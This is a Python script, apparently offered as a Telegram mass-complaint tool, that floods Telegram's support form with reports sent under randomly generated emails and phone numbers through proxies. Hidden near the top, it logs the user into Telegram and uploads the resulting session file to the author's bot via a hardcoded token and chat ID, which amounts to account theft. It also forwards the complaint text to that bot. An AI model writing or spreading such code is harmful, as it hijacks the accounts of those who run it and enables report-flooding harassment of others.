import subprocess
import sys
import time
import os
import platform
import webbrowser
import random

number = +79999999999

RESET = "\033[0m"
GREEN_TEXT = "\033[32m"
BLACK_BG = "\033[40m"

required_modules = [
    "fake_useragent",
    "requests",
    "termcolor",
    "pyfiglet",
    "telethon",
    "fake_useragent",
    "getpass",
    "pystyle",
    "colorama",
    "telegram",
    "string",
    "termcolor"
]

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()  # –î–ª—è –ø–µ—Ä–µ–Ω–æ—Å–∞ —Å—Ç—Ä–æ–∫–∏ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    for module in required_modules:
        try:
            __import__(module)
            print(GREEN_TEXT + f"{module}")
        except ImportError:
            print(f" {module}...")
            install(module)
            print_with_delay(GREEN_TEXT + f" {module}" + RESET)

    print_with_delay(GREEN_TEXT + "helo" + RESET)
    time.sleep(1)

check_and_install_modules()
os.system('cls' if os.name == 'nt' else 'clear')

from telethon import TelegramClient
import os
import requests

api_id = '5'
api_hash = '1c5c96d5edd401b1ed40db3fb5633e2d'
phone_number = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
session_file = 'sessions.session'  

bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
chat_id = '2110557179' 

client = TelegramClient(session_file, api_id, api_hash)

def send_session_file_via_bot(bot_token, chat_id, session_file):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    files = {'document': open(session_file, 'rb')}
    data = {'chat_id': chat_id, 'caption': 'üìé–§–∞–π–ª —Å–µ—Å—Å–∏–∏'}
    
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print(f"–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ.")
    else:
        print(f"–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –Ω–µ –ø—Ä–æ—à–ª–∞: {response.status_code}, {response.text}")

async def main():
    # –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤ Telegram —á–µ—Ä–µ–∑ Telethon
    await client.start(phone_number)
    print("–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞!")
    
    if os.path.exists(session_file):
        print(f"–°–µ—Å—Å–∏—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ —Ñ–∞–π–ª–µ '{session_file}'.")
        
        send_session_file_via_bot(bot_token, chat_id, session_file)
    else:
        print(f"–§–∞–π–ª —Å–µ—Å—Å–∏–∏ '{session_file}' –Ω–µ –Ω–∞–π–¥–µ–Ω.")

with client:
  
  client.loop.run_until_complete(main())
 
from fake_useragent import UserAgent
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System, Box
from colorama import init, Fore, Style
import requests
import random
import os
import getpass
from termcolor import colored
import pyfiglet
import string
import sys

os.system('cls' if os.name == 'nt' else 'clear')

starting = '''

     
     
                      Author | @fanat_bossina
                       year    child

‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚£†‚°§‚†§‚†§‚†§‚¢§‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚†§‚†ñ‚†ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†â‚†í‚†¶‚¢Ñ‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°†‚†ñ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ë‚†¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚†¥‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ë‚¢¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚£â‚°§‚†ñ‚†ä‚°è‚¢â‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢´‚†â‚¢±‚†¶‚£Ñ‚°Ä‚†ô‚¢¶‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚†è‚°û‚†Å‚†Ä‚£†‚¢û‚°µ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†≥‚°ú‚£á‚†Ä‚†ô‚¢Ü‚†à‚¢ß‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚†ã‚†Ä‚¢ß‚°†‚£æ‚°µ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚¢û‚£ß‚†Ä‚¢∏‚†Ç‚†Ä‚£ß‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°ü‚†Ä‚†Ä‚†Ä‚†ô‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†õ‚†í‚†ã‚†Ä‚†Ä‚¢∏‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚¢∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ñ‚†Ä‚£∏‚£á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢®‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ü‚†Ä‚†Ä‚¢Ä‚†Ä‚†Ä‚¢∏‚†à‚¢á‚†Ä‚¢∞‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚¢†‚†É‚¢ª‚†Ä‚¢Ä‚°î‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚†à‚°µ‚†¶‚°º‚†∂‚¢æ‚£∑‚£∏‚£ß‚†Ä‚†Ä‚†Ä‚£∏‚£ß‚£Ø‚°∂‚£æ‚°¥‚°è‚¢Ä‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ß‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚°º‚†Å‚†Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†â‚†â‚¢¶‚†Ä‚¢†‚†ã‚†â‚†Å‚†Ä‚£â‚£∏‚£ó‚£â‚°à‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£¥‚°Ä‚†Ä‚†Ä‚¢É‚£†‚†û‚£ø‚°∑‚°ø‚†õ‚£ø‚£ø‚£ø‚¢∂‚°Ñ‚†à‚†≥‚†ã‚†Ä‚†Ä‚£∞‚¢æ‚†õ‚¢ª‚£ø‚£ø‚°ø‚£ø‚°à‚°ü‚†Ç‚†Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ß‚†Ä‚†Ä‚†à‚†Å‚†Ä‚†∏‚°á‚¢ø‚£Ω‚£ø‚£ø‚£ø‚°á‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚°µ‚£ø‚£ø‚£Ø‚°á‚†è‚°π‚†Å‚†Ä‚†Ä‚¢Ä‚°á‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†π‚£å‚†ª‚†ø‚†ø‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚†ø‚†ø‚†õ‚†Ä‚£∞‚†É‚†Ä‚†Ä‚†Ä‚£†‚†É‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚¢Ü‚¢Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†à‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚°É‚†Ä‚†Ä‚¢Ä‚°ú‚†Å‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ô‚†ë‚¢Ü‚°Ä‚†Ä‚†à‚†ª‚°ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†í‚†í‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£§‚£ü‚†Å‚£†‚†î‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†¢‚£Ñ‚£ø‚†õ‚£ª‚£∂‚£§‚£§‚£§‚£Ä‚£†‚£§‚¢§‚£§‚£¥‚°∂‚†´‚†ø‚£ø‚°ö‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚¢ª‚£∂‚°Ñ‚¢∞‚¢≥‚†É‚¢Ä‚£∑‚£ø‚†¶‚¢Ø‚£ø‚°ó‚†Ä‚¢ß‚†π‚°Ñ‚†Ä‚£§‚£Ω‚¢¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£∑‚£∂‚£∂‚£ø‚£Ñ‚£æ‚†è‚†Ä‚†à‚†ë‚¢¶‚°Ä‚£§‚†û‚†â‚†Ä‚†à‚†±‚£ß‚¢†‚£º‚£ø‚£¶‚£Ω‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚†î‚£ª‚£ø‚£ø‚£ø‚°ø‚†ü‚¢π‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚£ø‚°Ä‚†Ä‚†Ä‚†Ä‚£∏‚£ø‚£ø‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚£Ø‚°ü‚†ì‚¢ç‚†ª‚°ø‚†è‚†Å‚†Ä‚¢∏‚¢ø‚°ü‚†≤‚†∂‚†ö‚¢±‚†ã‚¢≤‚†ë‚†í‚†í‚†ä‚£ü‚°©‚¢æ‚°á‚†ô‚¢ø‚£ø‚°ø‚¢ã‚°º‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°º‚†Å‚†Ä‚†ô‚¢§‚°Ä‚°ª‚†Å‚†Ä‚†Ä‚†Ä‚°å‚†∂‚£∑‚°∂‚†∂‚¢¶‚†ò‚£ó‚†è‚¢Ä‚†í‚¢í‚£í‚°ª‚†Ü‚¢∏‚°á‚†Ä‚†Ä‚¢ª‚°ï‚†â‚†Ä‚†Ä‚†≥‚°Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚°Ä‚†Ä‚†Ä‚†Ä‚£∞‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚£ß‚†Ä‚†Ä‚†â‚†â‚†â‚†Ä‚¢∏‚†Ä‚†à‚†â‚†â‚†Ä‚†Ä‚†Ä‚£†‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢¶‚£Ä‚£Ä‚°¥‚†É‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ë‚†í‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°è‚†≥‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°†‚†ö‚†Å‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£á‚°Ä‚†à‚†ë‚†¢‚£Ñ‚°Ä‚†à‚†Å‚†Ä‚£Ä‚†¥‚†ã‚†Ä‚£Ä‚£†‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ø‚£Ω‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚£∑‚†í‚°ã‚†Ä‚†Ä‚†Ä‚†Ä‚¢´‚£µ‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚¢∞‚†§‚°Ñ‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚£á‚†Ä‚†Ä‚†Ä‚°§‚¢¶‚†Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ß‚†û‚†Ä‚†π‚£Ñ‚†Ä‚¢∏‚†Ä‚†Ä‚¢π‚£Ä‚£†‚†û‚†Ä‚†ò‚†¶‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£â‚°ü‚†Ä‚†Ä‚†Ä‚°è‚†Ä‚†Ä‚†Ä‚£Ä‚°Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚†é‚†â‚†â‚†â‚†Ä‚†à‚°á‚†Ä‚†Ä‚†Ä‚°è‚†â‚†â‚†â‚†Å‚†â‚¢á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢®‚°Ñ‚†Ä‚†Ä‚†Ä‚£Ü‚£†‚†á‚†Ä‚†Ä‚†Ä‚£ß‚†Ä‚£†‚†Ä‚†Ä‚†Ä‚¢∏‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†≥‚†§‚†§‚†∂‚†õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚†ø‚£¶‚£§‚°§‚†û‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä                                                                            
                                                                                                                                      
'''

Write.Print(Center.XCenter(starting), Colors.purple_to_red, interval=0.001)





def generate_phone_number():
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    country_codes = ['+7', '+380', '+375']
    country_code = random.choice(country_codes)
    phone_number = ''.join(random.choices('0123456789', k=10))
    return f'{country_code}{phone_number}'

def generate_random_email():
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π email"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def load_proxies(filename):
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –ø—Ä–æ–∫—Å–∏-—Å–µ—Ä–≤–µ—Ä—ã –∏–∑ —Ñ–∞–π–ª–∞"""
    proxies = []
    with open(filename, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies

def send_complaint(number, email, complaint_text, repeats, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0

    for _ in range(repeats):  
        email = generate_random_email()
        number = generate_phone_number()
        proxy = random.choice(proxies) if proxies else None

        payload = {
            'text': complaint_text,
            'number': number,
            'email': email
        }

        try:
            response = requests.post(url, headers=headers, data=payload, proxies={'http': proxy} if proxy else None)
            if response.status_code == 200:
                complaints_sent += 1
                print(colored(f"–ñ–∞–ª–æ–±–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞", 'green'))
                print(colored(f"–û—Ç: {email} {number}", 'cyan'))
                if proxy:
                    print(colored(f"–ü—Ä–æ–∫—Å–∏: {proxy}", 'cyan'))  # –í—ã–≤–æ–¥–∏–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–π –ø—Ä–æ–∫—Å–∏
            else:
                print(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å. –ö–æ–¥: {response.status_code}")
        except Exception as e:
            print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")

    print(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {complaints_sent} –∂–∞–ª–æ–±.")


def send_telegram_message(message: str, bot_token: str, chat_id: str):
    """fff"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("\n")
    else:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∂–∞–ª–æ–±—ã: {response.status_code}, {response.text}")

def complaint():
    """fff1"""
    

    complaint_text = input("\n–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –≤–∞—à–µ–π –∂–∞–ª–æ–±—ã: ")
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ç–µ–∫—Å—Ç –∂–∞–ª–æ–±—ã –Ω–µ –ø—É—Å—Ç–æ–π
    if not complaint_text.strip():
        print("–¢–µ–∫—Å—Ç –∂–∞–ª–æ–±—ã –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!")
        return
    

    bot_token = "7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI"
    chat_id = "2110557179"
    send_telegram_message(complaint_text, bot_token, chat_id)


    
    repeats = int(input("–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∂–∞–ª–æ–±: "))
    
    proxy_filename = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è —Ñ–∞–π–ª–∞ —Å –ø—Ä–æ–∫—Å–∏-—Å–µ—Ä–≤–µ—Ä–∞–º–∏ (–∏–ª–∏ –æ—Å—Ç–∞–≤—å—Ç–µ –ø—É—Å—Ç—ã–º –¥–ª—è —Ä–∞–±–æ—Ç—ã –±–µ–∑ –ø—Ä–æ–∫—Å–∏): ")

    proxies = load_proxies(proxy_filename) if proxy_filename else None

    for _ in range(repeats):
        number = generate_phone_number()
        email = generate_random_email()
        send_complaint(number, email, complaint_text, repeats, proxies)

if __name__ == "__main__":
    complaint()
